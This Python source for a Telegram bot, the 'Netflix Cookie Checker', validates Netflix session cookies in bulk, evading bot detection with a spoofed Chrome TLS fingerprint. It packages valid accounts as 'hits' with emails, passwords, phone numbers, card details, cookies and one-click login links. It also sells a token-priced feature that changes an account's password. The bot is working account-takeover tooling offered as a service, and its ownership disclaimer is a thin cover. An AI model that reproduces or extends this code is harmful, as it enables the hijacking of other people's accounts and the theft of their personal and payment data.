        prof_count = result.get("profile_count")     or len(result.get("profile_names") or []) or 0
        flag       = _flag(country)
        nft        = result.get("nftoken")           or {}
        issues     = result.get("account_issues")    or []

        W = 66
        sep  = "═" * W
        thin = "─" * W

        def box_line(label: str, value: str) -> str:
            return f"  {label:<20} {value}"

        lines = [
            sep,
            f"  NETFLIX HIT  #{i}/{total}   —   {plan.upper()}",
            sep,
            "",
            f"  {'ACCOUNT DETAILS':^{W-2}}",
            thin,
        ]
        lines.append(box_line("Email:", email))
        if pwd:
            lines.append(box_line("Password:", pwd))
        if name:
            lines.append(box_line("Name:", name))
        if phone:
            lines.append(box_line("Phone:", phone))
        lines.append(box_line("Country:", f"{country} {flag}".strip()))
        lines.append(box_line("Status:", "On Hold ⏸" if status == "on_hold" else "Active ✅"))
        lines += [
            "",
            f"  {'SUBSCRIPTION':^{W-2}}",
            thin,
        ]
        lines.append(box_line("Plan:", plan))
        lines.append(box_line("Quality:", f"{quality}  ·  {streams} screen(s)"))
        lines.append(box_line("Price:", price))
        lines.append(box_line("Member Since:", since))
        lines.append(box_line("Next Billing:", billing))
        lines.append(box_line("Payment:", payment))
        if ct:
            card_str = ct
            if cl4:
                card_str += f" ···· {cl4}"
            if cexp:
                card_str += f"  (exp {cexp})"
            lines.append(box_line("Card:", card_str))
        lines.append(box_line("Hold Status:", "Yes ⏸" if is_hold else "No"))
        lines.append(box_line("Free Trial:", "Yes" if free_trial else "No"))
        lines.append(box_line("Extra Member:", f"Yes — {num_ex} slot(s)" if num_ex > 0 else "No"))
        lines.append(box_line("Email Verified:", ev))
        lines.append(box_line("Membership:", ms))
        lines.append(box_line("Profiles:", str(prof_count) if prof_count else "Unknown"))
        if profiles:
            lines.append(box_line("Profile Names:", profiles))
        lines.append(box_line("Source:", source))
        if issues:
            lines += ["", f"  {'ACCOUNT ALERTS':^{W-2}}", thin]
            for iss in issues:
                lines.append(f"  ⚠  {iss}")

        # Login links
        lines += ["", f"  {'LOGIN LINKS':^{W-2}}", thin]
        if nft.get("success"):
            lines.append("  PC Login (copy & open in browser):")
            lines.append(f"  {nft.get('pc_url', '')}")
            lines.append("")
            lines.append("  Mobile Login (copy & open on phone):")
            lines.append(f"  {nft.get('mobile_url', '')}")
            if nft.get("expires"):
                lines.append("")
                lines.append(box_line("Link Expires:", nft["expires"]))
        else:
            lines.append(box_line("Status:", f"Unavailable — {nft.get('error', 'token generation failed')}"))

        # Cookies
        lines += ["", f"  {'COOKIES  (Netscape HTTP Cookie File)':^{W-2}}", thin]
        if nf_id:
            lines.append(f"  .netflix.com\tTRUE\t/\tTRUE\t{exp}\tNetflixId\t{nf_id}")
        if nf_sec:
            lines.append(f"  .netflix.com\tTRUE\t/\tTRUE\t{exp}\tSecureNetflixId\t{nf_sec}")
        if nf_vid:
            lines.append(f"  .netflix.com\tTRUE\t/\tFALSE\t{exp}\tnfvdid\t{nf_vid}")

        # Watermark
        wm = f"@{_BOT_USERNAME}" if _BOT_USERNAME else "Netflix Cookie Checker"
        lines += ["", thin, f"  {'Checked by ' + wm:^{W-2}}", sep, ""]
        return "\n".join(lines)

    # ── Build ZIP in memory ───────────────────────────────────────────────
    buf = io.BytesIO()
    total_hits = len(deduped)

    try:
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            # Summary file
            on_hold_count = sum(1 for r, _, _ in deduped if r.get("status") == "on_hold")
            W = 52
            summary_lines = [
                "╔" + "═" * W + "╗",
                f"║{'  NETFLIX HITS  —  ' + today:^{W}}║",
                "╠" + "═" * W + "╣",
                f"║{'':^{W}}║",
                f"║  Total Hits     :  {total_hits:<{W-20}}║",
                f"║  Premium Hits   :  {len(premium):<{W-20}}║",
                f"║  Normal Hits    :  {len(normal):<{W-20}}║",
                f"║  On Hold (incl.):  {on_hold_count:<{W-20}}║",
                f"║{'':^{W}}║",
            ]
            if dupes_removed > 0:
                summary_lines.append(f"║  Dupes Removed  :  {dupes_removed:<{W-20}}║")
            summary_lines += [
                "╚" + "═" * W + "╝",
                "",
                "Each account file contains:",
                "  • Full account details",
                "  • Cookie (Netscape format)",
                "  • One-click login link",
            ]
            zf.writestr("_SUMMARY.txt", "\n".join(summary_lines))

            # Premium Hits folder
            for i, (result, src, _) in enumerate(premium, 1):
                email   = result.get("email") or f"account_{i}"
                safe    = re.sub(r'[^\w@._-]', '_', email)[:35]
                plan    = re.sub(r'[^\w ]', '', result.get("plan_name") or "Premium")[:20].strip()
                c_flag  = _flag(result.get("country") or "")
                flag_pre = f"{c_flag}_" if c_flag else ""
                fname   = f"Premium Hits/{i:02d}_{flag_pre}{safe}_{plan}.txt"
                zf.writestr(fname, _account_file(i, len(premium), result, src))

            # Normal Hits folder
            for i, (result, src, _) in enumerate(normal, 1):
                email   = result.get("email") or f"account_{i}"
                safe    = re.sub(r'[^\w@._-]', '_', email)[:35]
                plan    = re.sub(r'[^\w ]', '', result.get("plan_name") or "Hit")[:20].strip()
                c_flag  = _flag(result.get("country") or "")
                flag_pre = f"{c_flag}_" if c_flag else ""
                fname   = f"Normal Hits/{i:02d}_{flag_pre}{safe}_{plan}.txt"
                zf.writestr(fname, _account_file(i, len(normal), result, src))

    except Exception as _zip_err:
        logger.exception("send_hits_zip: ZIP build failed")
        raise RuntimeError(f"ZIP build failed: {_zip_err}") from _zip_err

    buf.seek(0)
    rand2    = random.randint(10, 99)
    zip_name = f"Netflix-Hits-{total_hits}x-{rand2}.zip"

    caption_parts = [
        f"📦 <b>Netflix-Hits-{total_hits}x-{rand2}.zip</b>",
        "",
        f"  🌟 Premium Hits  »  <b>{len(premium)}</b>",
        f"  ✅ Normal Hits   »  <b>{len(normal)}</b>",
        f"  📊 Total         »  <b>{total_hits}</b>",
    ]
    if dupes_removed > 0:
        caption_parts.append(f"  ♻️ Dupes removed »  <b>{dupes_removed}</b>")
    caption_parts += [
        "",
        "📁 <b>ZIP structure:</b>",
        "  <code>Premium Hits/</code>  — Premium account files",
        "  <code>Normal Hits/</code>   — Standard / Basic / other files",
        "  <code>_SUMMARY.txt</code>   — Overview",
        "",
        "<i>Each file: full details · cookie · login link</i>",
    ]

    await update.message.reply_document(
        document=buf,
        filename=zip_name,
        caption="\n".join(caption_parts),
        parse_mode=ParseMode.HTML,
    )


# ---------------------------------------------------------------------------
# Commands
# ---------------------------------------------------------------------------

async def cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer("Cancelling…")
    try:
        msg_id = int(query.data.split(":")[1])
        _CANCEL_SESSIONS.add(msg_id)
    except Exception:
        pass


async def mode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Inline button: toggle full/basic mode."""
    query = update.callback_query
    try:
        user_id = int(query.data.split(":")[1])
        new_mode = _toggle_mode(user_id)
        await query.answer(f"Switched to {'Full' if new_mode == 'full' else 'Basic'} mode ✅")
    except Exception:
        await query.answer("Could not toggle mode.")


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user:
        stats_tracker.record_user(update.effective_user.id)
        user_store.register_user(update.effective_user.id)
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🪙 Buy Tokens",       callback_data="nav:buy"),
            InlineKeyboardButton("👤 My Account",       callback_data="nav:account"),
        ],
        [
            InlineKeyboardButton("🔐 Change Password ✨", callback_data="nav:changepw"),
        ],
        [
            InlineKeyboardButton("📖 Help",             callback_data="nav:help"),
            InlineKeyboardButton("⚙️ Settings",         callback_data="nav:settings"),
        ],
    ])
    await update.message.reply_text(
        "🎬 <b>Netflix Cookie Checker</b>\n\n"
        "Drop a cookie → get <b>live</b> account details instantly.\n\n"
        "📁 <b>Formats</b>\n"
        "<code>.txt</code>  <code>.json</code>  <code>.zip</code>  · paste text\n\n"
        "📋 <b>Per account</b>\n"
        "Plan · Quality · Country · Price · Billing\n"
        "Email · Phone · Profiles · Login links\n\n"
        "📦 Bulk mode → live progress → ZIP of all hits\n\n"
        "🔐 <b>Change Password</b> — Change any Netflix account's password directly from the bot! (5 tokens)",
        parse_mode=ParseMode.HTML,
        reply_markup=kb,
    )


async def nav_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle start-message quick-action buttons."""
    query = update.callback_query
    await query.answer()
    action = query.data.split(":")[1]
    uid = query.from_user.id if query.from_user else 0
    if action == "buy":
        await _send_buy_menu(query.message.chat_id, context)
    elif action == "account":
        await _send_account(query.message.chat_id, uid, context)
    elif action == "help":
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=_help_text(),
            parse_mode=ParseMode.HTML,
        )
    elif action == "settings":
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=_settings_text(uid),
            parse_mode=ParseMode.HTML,
            reply_markup=_settings_markup(uid),
        )
    elif action == "changepw":
        cost = _TOKEN_COSTS["changepw"]
        chat_id = query.message.chat_id
        # Admin: free, start immediately
        if is_admin(uid):
            _start_changepw_flow(uid)
            await context.bot.send_message(
                chat_id=chat_id,
                text=(
                    "🔐 <b>Change Password</b>  <i>[BETA]</i>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "⚠️ <b>Warning:</b> This will permanently change the account's Netflix password.\n"
                    "Only use this on accounts you own or have explicit permission to modify.\n\n"
                    "Send /cancel at any time to abort.\n\n"
                    "Step 1 of 3 — Enter the <b>NetflixId</b> cookie value for the account:\n"
                    "<i>(the raw NetflixId string from the cookie)</i>"
                ),
                parse_mode=ParseMode.HTML,
            )
            return
        # Already in a flow
        if uid in _CHANGEPW_STATE:
            step = _CHANGEPW_STATE[uid].get("step", "")
            if step == "confirm_pending":
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="🔐 <b>Confirmation pending</b>\n\nPlease tap <b>Confirm</b> or <b>Cancel</b> on the previous message.",
                    parse_mode=ParseMode.HTML,
                )
            else:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="🔐 <b>Session in progress</b>\n\nYou have an active Change Password session. Continue, or /cancel to abort.",
                    parse_mode=ParseMode.HTML,
                )
            return
        # Check balance
        balance = user_store.get_balance(uid)
        if balance < cost:
            await context.bot.send_message(
                chat_id=chat_id,
                text=(
                    f"🔐 <b>Change Password</b>  <i>[BETA]</i>\n\n"
                    f"This feature costs <b>{cost} 🪙 tokens</b> per use.\n"
                    f"Your balance: <b>{balance} 🪙</b>\n\n"
                    "💰 /buy — Get tokens\n"
                    "👤 /account — View your balance"
                ),
                parse_mode=ParseMode.HTML,
            )
            return
        # Show confirmation — identical to /changepw command
        _CHANGEPW_STATE[uid] = {"step": "confirm_pending"}
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"🔐 <b>Change Password</b>  <i>[BETA]</i>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"This will cost <b>{cost} 🪙 tokens</b>.\n"
                f"Your current balance: <b>{balance} 🪙</b>\n\n"
                "⚠️ <b>Warning:</b> This permanently changes the Netflix account's password.\n"
                "Only use on accounts you own or have explicit permission to modify.\n\n"
                "Do you want to proceed?"
            ),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton(f"✅ Confirm ({cost} 🪙)", callback_data=f"changepw_confirm:{uid}:yes"),
                InlineKeyboardButton("❌ Cancel",               callback_data=f"changepw_confirm:{uid}:no"),
            ]]),
        )


def _help_text() -> str:
    return (
        "📖 <b>Supported Cookie Formats</b>\n\n"
        "<b>1. Netscape (.txt)</b>\n"
        "<code>.netflix.com  TRUE  /  TRUE  9999  NetflixId  ct%3D…</code>\n\n"
        "<b>2. Pipe-combo (.txt)</b>\n"
        "<code>email:pass | Country=IN | NetflixId=ct%3D…</code>\n\n"
        "<b>3. JSON (.json)</b>\n"
        '<code>[{"name":"NetflixId","value":"ct%3D…"}]</code>\n\n'
        "<b>4. ZIP (.zip)</b>\n"
        "Drop a ZIP — each <code>.txt</code> / <code>.json</code> inside = 1 account.\n\n"
        "📦 <b>Bulk mode</b>\n"
        "Multi-account files → live progress → ZIP with Premium &amp; Normal folders.\n\n"
        "⚙️ <b>Commands</b>\n"
        "/account · /buy · /myproxy · /changepw\n"
        "/settings · /mode · /info · /cancel"
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(_help_text(), parse_mode=ParseMode.HTML)


async def mode_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    current = _get_mode(uid)
    await update.message.reply_text(
        f"⚙️ <b>Output Mode</b>\n\n"
        f"Current: <b>{'Full Info' if current == 'full' else 'Basic'}</b>\n\n"
        "Choose your preferred mode:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("📋 Full Info",  callback_data=f"setmode:{uid}:full"),
                InlineKeyboardButton("📄 Basic",      callback_data=f"setmode:{uid}:basic"),
            ]
        ]),
    )


async def setmode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    caller_uid = query.from_user.id if query.from_user else 0
    try:
        _, uid_str, new_mode = query.data.split(":")
        uid = int(uid_str)
        if uid != caller_uid:
            await query.answer("Not your settings panel.", show_alert=True)
            return
        _USER_MODE[uid] = new_mode
        label = "Full Info" if new_mode == "full" else "Basic"
        await query.answer(f"Output format set to {label} ✅")
        await query.edit_message_text(
            _settings_text(uid),
            parse_mode=ParseMode.HTML,
            reply_markup=_settings_markup(uid),
        )
    except Exception:
        await query.answer("Error setting mode.")


async def fullinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    _USER_MODE[uid] = "full"
    await update.message.reply_text("✅ Output mode set to <b>Full Info</b>.", parse_mode=ParseMode.HTML)


async def basic_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    _USER_MODE[uid] = "basic"
    await update.message.reply_text("✅ Output mode set to <b>Basic</b>.", parse_mode=ParseMode.HTML)


async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show current settings with inline buttons to change output format and delivery mode."""
    uid = update.effective_user.id if update.effective_user else 0
    await update.message.reply_text(
        _settings_text(uid),
        parse_mode=ParseMode.HTML,
        reply_markup=_settings_markup(uid),
    )


async def setdelivery_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Inline button: set delivery mode (zip or cards)."""
    query = update.callback_query
    caller_uid = query.from_user.id if query.from_user else 0
    try:
        _, uid_str, new_delivery = query.data.split(":")
        uid = int(uid_str)
        if uid != caller_uid:
            await query.answer("Not your settings panel.", show_alert=True)
            return
        _set_delivery(uid, new_delivery)
        label = "Card-by-Card 💬" if new_delivery == "cards" else "ZIP 📦"
        await query.answer(f"Delivery mode set to {label} ✅")
        await query.edit_message_text(
            _settings_text(uid),
            parse_mode=ParseMode.HTML,
            reply_markup=_settings_markup(uid),
        )
    except Exception:
        await query.answer("Error setting delivery mode.")


async def closesettings_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Close (delete) the settings panel message."""
    query = update.callback_query
    await query.answer()
    try:
        await query.message.delete()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Beta — Change Password helpers
# ---------------------------------------------------------------------------

def _extract_netflix_id(text: str) -> str:
    """
    Extract a raw NetflixId cookie value from various user inputs:
    - Full JSON cookie array (browser extension export)
    - 'NetflixId=ct%3D...' or '"NetflixId=ct%3D..."' string
    - Raw cookie value (ct%3D... or plain token)
    Returns the raw value string (URL-encoded, as Netflix expects it),
    or empty string if nothing useful found.
    """
    import json as _json

    raw = text.strip().strip('"').strip("'")

    # ── Try JSON array (browser extension cookie export) ──────────────────
    if raw.startswith("[") or raw.startswith("{"):
        try:
            data = _json.loads(raw)
            cookies = data if isinstance(data, list) else [data]
            for c in cookies:
                if isinstance(c, dict) and c.get("name") == "NetflixId":
                    return (c.get("value") or "").strip()
        except Exception:
            pass

    # ── Try 'NetflixId=value' format (with optional prefix junk) ─────────
    if "NetflixId=" in raw:
        after = raw.split("NetflixId=", 1)[1]
        # Stop at semicolons, quotes, newlines, spaces
        val = after.split(";")[0].split('"')[0].split("'")[0].split("\n")[0].split("\r")[0].strip()
        if val:
            return val

    # ── Raw cookie value — return as-is if it looks like a Netflix token ──
    # Netflix tokens start with ct%3D (URL-encoded 'ct=') or are long opaque strings
    if len(raw) >= 20 and "\n" not in raw and " " not in raw:
        return raw

    return ""


def _start_changepw_flow(uid: int) -> None:
    """Initialise the change-password state machine for a user."""
    _CHANGEPW_STATE.pop(uid, None)
    _CHANGEPW_STATE[uid] = {"step": "netflix_id"}


async def changepw_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """[BETA] Start an interactive flow to change a Netflix account's password."""
    uid = update.effective_user.id if update.effective_user else 0

    # Admins use it for free — skip confirmation
    if is_admin(uid):
        _start_changepw_flow(uid)
        await update.message.reply_text(
            "🔐 <b>Change Password</b>  <i>[BETA]</i>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ <b>Warning:</b> This will permanently change the account's Netflix password.\n"
            "Only use this on accounts you own or have explicit permission to modify.\n\n"
            "Send /cancel at any time to abort.\n\n"
            "Step 1 of 3 — Enter the <b>NetflixId</b> cookie value for the account:\n"
            "<i>(the raw NetflixId string from the cookie)</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    # Non-admins: if they already have an active flow, let them continue it
    if uid in _CHANGEPW_STATE:
        step = _CHANGEPW_STATE[uid].get("step", "")
        if step == "confirm_pending":
            await update.message.reply_text(
                "🔐 <b>Confirmation pending</b>\n\n"
                "Please tap <b>Confirm</b> or <b>Cancel</b> on the previous message.",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(
                "🔐 <b>Session in progress</b>\n\n"
                "You have an active Change Password session. Continue, or /cancel to abort.",
                parse_mode=ParseMode.HTML,
            )
        return

    # Non-admins: costs tokens — show confirmation BEFORE deducting
    cost = _TOKEN_COSTS["changepw"]
    balance = user_store.get_balance(uid)
    if balance < cost:
        await update.message.reply_text(
            f"🔐 <b>Change Password</b>  <i>[BETA]</i>\n\n"
            f"This feature costs <b>{cost} 🪙 tokens</b> per use.\n"
            f"Your balance: <b>{balance} 🪙</b>\n\n"
            "💰 /buy — Get tokens\n"
            "👤 /account — View your balance",
            parse_mode=ParseMode.HTML,
        )
        return

    # Set state to "confirm_pending" — tokens NOT deducted yet
    _CHANGEPW_STATE[uid] = {"step": "confirm_pending"}
    await update.message.reply_text(
        f"🔐 <b>Change Password</b>  <i>[BETA]</i>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"This will cost <b>{cost} 🪙 tokens</b>.\n"
        f"Your current balance: <b>{balance} 🪙</b>\n\n"
        "⚠️ <b>Warning:</b> This permanently changes the Netflix account's password.\n"
        "Only use on accounts you own or have explicit permission to modify.\n\n"
        "Do you want to proceed?",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton(f"✅ Confirm ({cost} 🪙)", callback_data=f"changepw_confirm:{uid}:yes"),
            InlineKeyboardButton("❌ Cancel",               callback_data=f"changepw_confirm:{uid}:no"),
        ]]),
    )


async def changepw_confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the Confirm / Cancel inline buttons for the changepw flow."""
    query = update.callback_query
    uid   = query.from_user.id if query.from_user else 0
    await query.answer()

    parts = query.data.split(":")  # changepw_confirm:{uid}:{choice}
    if len(parts) < 3:
        return
    try:
        target_uid = int(parts[1])
    except ValueError:
        return
    choice = parts[2]  # "yes" | "no"

    if target_uid != uid:
        await query.answer("Not your session.", show_alert=True)
        return

    state = _CHANGEPW_STATE.get(uid)
    if not state or state.get("step") != "confirm_pending":
        await query.message.edit_text(
            "⏰ <b>Session expired.</b> Run /changepw again.",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── User cancelled ────────────────────────────────────────────────────
    if choice == "no":
        _CHANGEPW_STATE.pop(uid, None)
        await query.message.edit_text(
            "❌ <b>Change Password cancelled.</b>\n\n"
            "<i>No tokens were deducted.</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── User confirmed — NOW deduct tokens ────────────────────────────────
    cost = _TOKEN_COSTS["changepw"]
    ok, new_bal = user_store.deduct_tokens(uid, cost, reason="changepw")
    if not ok:
        _CHANGEPW_STATE.pop(uid, None)
        await query.message.edit_text(
            "⚠️ <b>Could not deduct tokens.</b> Your balance may have changed.\n\n"
            "Run /changepw again.",
            parse_mode=ParseMode.HTML,
        )
        return

    # Start the actual flow
    _CHANGEPW_STATE[uid] = {"step": "netflix_id", "tokens_deducted": True}
    await query.message.edit_text(
        f"🔐 <b>Change Password</b>  <i>[BETA]</i>\n\n"
        f"✅ <b>{cost} tokens deducted</b> — balance: <b>{new_bal} 🪙</b>\n\n"
        "⚠️ This will permanently change the account's Netflix password.\n"
        "Only use on accounts you own or have permission to modify.\n\n"
        "Send /cancel at any time to abort <i>(tokens will be refunded)</i>.\n\n"
        "Step 1 of 3 — Enter the <b>NetflixId</b> cookie value:",
        parse_mode=ParseMode.HTML,
    )


async def _handle_changepw_input(update: Update, uid: int, text: str) -> None:
    """Route text input through the Change Password state machine."""
    state = _CHANGEPW_STATE.get(uid)
    if not state:
        return

    step = state.get("step")

    # ── Waiting for inline button confirmation — ignore text input ────────
    if step == "confirm_pending":
        await update.message.reply_text(
            "⏳ <b>Please use the buttons</b> — tap ✅ Confirm or ❌ Cancel on the previous message.\n\n"
            "Or send /cancel to abort.",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── Cancel shortcut ───────────────────────────────────────────────────
    if text.strip().lower() in ("/cancel", "cancel"):
        cancelled_state = _CHANGEPW_STATE.pop(uid, None)
        refund_msg = ""
        if cancelled_state and cancelled_state.get("tokens_deducted") and not is_admin(uid):
            refund = _TOKEN_COSTS.get("changepw", 5)
            user_store.add_tokens(uid, refund, reason="changepw_refund_cancel")
            refund_msg = f"\n🪙 <b>{refund} tokens refunded</b> to your balance."
        await update.message.reply_text(
            f"❌ <b>Change Password cancelled.</b>{refund_msg}",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── Step 1: Collect NetflixId ─────────────────────────────────────────
    if step == "netflix_id":
        netflix_id = _extract_netflix_id(text)
        if not netflix_id or len(netflix_id) < 20:
            await update.message.reply_text(
                "⚠️ Could not find a valid NetflixId in what you sent.\n\n"
                "Please send <b>one</b> of these:\n"
                "• The raw <code>NetflixId</code> cookie value (starting with <code>ct%3D</code>)\n"
                "• A <code>NetflixId=ct%3D…</code> string\n"
                "• A full JSON cookie array exported from a browser extension\n\n"
                "Or send /cancel to abort.",
                parse_mode=ParseMode.HTML,
            )
            return
        state["netflix_id"] = netflix_id
        state["step"]       = "old_pw"
        await update.message.reply_text(
            "✅ NetflixId extracted.\n\n"
            "Step 2 of 3 — Send the account's <b>current password</b>:\n"
            "<i>Your message will NOT be stored after this step.</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── Step 2: Collect current password ─────────────────────────────────
    if step == "old_pw":
        if len(text.strip()) < 4:
            await update.message.reply_text(
                "⚠️ Password looks too short. Please try again or /cancel.",
                parse_mode=ParseMode.HTML,
            )
            return
        state["old_pw"] = text.strip()
        state["step"]   = "new_pw"
        await update.message.reply_text(
            "✅ Got it.\n\n"
            "Step 3 of 3 — Send the <b>new password</b> you want to set:\n"
            "<i>Must be at least 8 characters.</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── Step 3: Collect new password + confirmation ───────────────────────
    if step == "new_pw":
        new_pw = text.strip()
        if len(new_pw) < 8:
            await update.message.reply_text(
                "⚠️ New password must be at least 8 characters. Please try again or /cancel.",
                parse_mode=ParseMode.HTML,
            )
            return
        state["new_pw"] = new_pw
        state["step"]   = "confirm"
        await update.message.reply_text(
            f"🔒 <b>Confirm password change</b>\n\n"
            f"New password will be set to: <code>{new_pw}</code>\n\n"
            "Reply <b>YES</b> to confirm, or /cancel to abort.",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── Step 4: Confirm + execute ─────────────────────────────────────────
    if step == "confirm":
        if text.strip().upper() != "YES":
            await update.message.reply_text(
                "❌ Not confirmed. Send <b>YES</b> to proceed or /cancel to abort.",
                parse_mode=ParseMode.HTML,
            )
            return

        netflix_id = state.get("netflix_id", "")
        old_pw     = state.get("old_pw", "")
        new_pw     = state.get("new_pw", "")
        _CHANGEPW_STATE.pop(uid, None)

        status_msg = await update.message.reply_text(
            "⏳ <b>Changing password…</b>\n"
            "<i>Authenticating → Key exchange → Submitting…</i>",
            parse_mode=ParseMode.HTML,
        )

        loop = asyncio.get_event_loop()
        try:
            from password_changer import change_netflix_password
            result = await loop.run_in_executor(
                None,
                lambda: change_netflix_password(netflix_id, old_pw, new_pw),
            )
        except Exception as exc:
            logger.exception("change_netflix_password raised for uid %s", uid)
            await status_msg.edit_text(
                f"⚠️ <b>Unexpected error</b>\n<code>{exc}</code>",
                parse_mode=ParseMode.HTML,
            )
            return

        if result["success"]:
            await status_msg.edit_text(
                "✅ <b>Password Changed Successfully!</b>  <i>[BETA]</i>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🔑 New password: <code>{new_pw}</code>\n\n"
                "The old password no longer works.\n"
                "<i>Keep this safe — the bot does not store it.</i>",
                parse_mode=ParseMode.HTML,
            )
        else:
            # Refund tokens on system failure
            if not is_admin(uid):
                refund = _TOKEN_COSTS.get("changepw", 5)
                user_store.add_tokens(uid, refund, reason="changepw_refund_failure")
            await status_msg.edit_text(
                "❌ <b>Password Change Failed</b>  <i>[BETA]</i>\n\n"
                f"{result['message']}\n\n"
                f"🪙 <b>{_TOKEN_COSTS.get('changepw', 5)} tokens refunded</b> to your balance.\n\n"
                "<i>Check that the NetflixId and current password are correct, "
                "then try again with /changepw</i>",
                parse_mode=ParseMode.HTML,
            )


async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show bot info, live stats, and quick command reference."""
    s   = stats_tracker.get_stats()
    uid = update.effective_user.id if update.effective_user else 0

    total_checks = s.get("total_checks", 0)
    hits         = s.get("total_hits", 0)
    invalids     = s.get("total_invalids", 0)
    errors       = s.get("total_errors", 0)
    frees        = s.get("total_frees", 0)
    on_hold      = s.get("total_on_hold", 0)
    users        = s.get("total_users", 0)
    uptime       = s.get("uptime", "—")
    hit_rate     = s.get("hit_rate", 0)
    cpm          = s.get("checks_per_min", 0)
    active       = len(_ACTIVE_USERS)
    mode_label     = "Full Info" if _get_mode(uid) == "full" else "Basic"
    delivery_label = "Card-by-Card 💬" if _get_delivery(uid) == "cards" else "ZIP 📦"

    await update.message.reply_text(
        "ℹ️ <b>Netflix Cookie Checker — Bot Info</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🤖 <b>About</b>\n"
        "  Validates Netflix cookies <b>live</b> against Netflix servers.\n"
        "  Uses Chrome124 TLS fingerprint to bypass bot detection.\n"
        "  Formats: Netscape, JSON, pipe-combo, hit-file, ZIP.\n\n"
        "📊 <b>Session Stats</b> <i>(since last restart)</i>\n"
        f"  ⏱️ Uptime          »  <b>{uptime}</b>\n"
        f"  📦 Total checked   »  <b>{total_checks}</b>\n"
        f"  ✅ Hits            »  <b>{hits}</b>  ({hit_rate}% hit rate)\n"
        f"  ⏸️ On Hold         »  <b>{on_hold}</b>\n"
        f"  🔓 Free accounts   »  <b>{frees}</b>\n"
        f"  ❌ Invalid/Expired »  <b>{invalids}</b>\n"
        f"  ⚠️ Errors          »  <b>{errors}</b>\n"
        f"  👤 Unique users    »  <b>{users}</b>\n"
        f"  🔄 Active checks   »  <b>{active}</b>\n"
        f"  🚀 Speed (last 60s)»  <b>{cpm} checks/min</b>\n\n"
        "⚙️ <b>Your Settings</b>\n"
        f"  Output mode:   <b>{mode_label}</b>\n"
        f"  Delivery mode: <b>{delivery_label}</b>\n\n"
        "📋 <b>Commands</b>\n"
        "  /start      — Welcome &amp; overview\n"
        "  /help       — Formats &amp; bulk mode guide\n"
        "  /info       — This page\n"
        "  /settings   — Output format &amp; delivery mode\n"
        "  /mode       — Toggle output mode\n"
        "  /basic      — Switch to Basic mode\n"
        "  /fullinfo   — Switch to Full Info mode\n"
        "  /cancel     — Cancel your active check",
        parse_mode=ParseMode.HTML,
    )


# ---------------------------------------------------------------------------
# Global error handler
# ---------------------------------------------------------------------------

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Catch-all handler — prevents unhandled exceptions from crashing the bot."""
    from telegram.error import (
        BadRequest, TimedOut, NetworkError,
        RetryAfter, Forbidden, Conflict, TelegramError,
    )
    err = context.error

    # Conflict: previous polling session still alive — auto-resolves in ~60s
    if isinstance(err, Conflict):
        logger.info("Telegram Conflict (old session still closing) — will auto-resolve")
        return
    # Rate limited
    if isinstance(err, RetryAfter):
        logger.warning("Telegram rate limit: retry after %ss", err.retry_after)
        return
    # Transient network errors
    if isinstance(err, (TimedOut, NetworkError)):
        logger.warning("Telegram network error: %s", err)
        return
    # Bot blocked by user
    if isinstance(err, Forbidden):
        logger.info("Bot blocked by user — ignoring")
        return
    # Bad request (e.g. message too long, can't edit, etc.)
    if isinstance(err, BadRequest):
        logger.warning("Telegram BadRequest: %s", err)
        return

    # Unexpected error — log it and notify the user if possible
    logger.error("Unhandled exception in handler: %s", err, exc_info=context.error)

    # Make sure the user's session lock is released
    if isinstance(update, Update) and update.effective_user:
        uid = update.effective_user.id
        _ACTIVE_USERS.pop(uid, None)
